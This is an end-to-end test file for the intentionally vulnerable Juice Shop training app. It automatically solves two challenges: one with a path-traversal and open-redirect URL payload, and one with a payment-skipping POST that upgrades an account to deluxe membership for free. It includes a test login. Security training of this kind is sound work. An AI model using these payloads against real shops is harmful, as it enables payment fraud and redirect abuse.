/*
 * Copyright (c) 2014-2020 Bjoern Kimminich.
 * SPDX-License-Identifier: MIT
 */

const config = require('config')
const request = require('request')

describe('/#/deluxe-membership', () => {
  describe('challenge "svgInjection"', () => {
    protractor.beforeEach.login({ email: 'jim@' + config.get('application.domain'), password: 'ncc-1701' })

    it('should be possible to pass in a forgotten test parameter abusing the redirect-endpoint to load an external image', () => {
      browser.get('/#/deluxe-membership?testDecal=..%2F..%2F..%2F..%2Fredirect%3Fto%3Dhttps:%2F%2Fplacekitten.com%2Fg%2F200%2F100%3Fx%3Dhttps:%2F%2Fgithub.com%2Fbkimminich%2Fjuice-shop')
    })

    protractor.expect.challengeSolved({ challenge: 'Cross-Site Imaging' })
  })

  describe('challenge "freeDeluxe"', () => {
    protractor.beforeEach.login({ email: 'jim@' + config.get('application.domain'), password: 'ncc-1701' })

    it('should upgrade to deluxe for free by making a post request to /rest/deluxe-membership by setting the paymentMode parameter to null', () => {
      browser.get('/#/')
      browser.manage().getCookie('token').then((token) => {
        request.post('http://localhost:3000/rest/deluxe-membership', {
          headers: { Authorization: 'Bearer ' + token.value }
        }, (err, response, body) => {
          expect(err).not.toBeTruthy()
          expect(JSON.parse(body).status).toEqual('success')

          protractor.expect.challengeSolved({ challenge: 'Deluxe Fraud' })
        })
      })
    })
  })
})
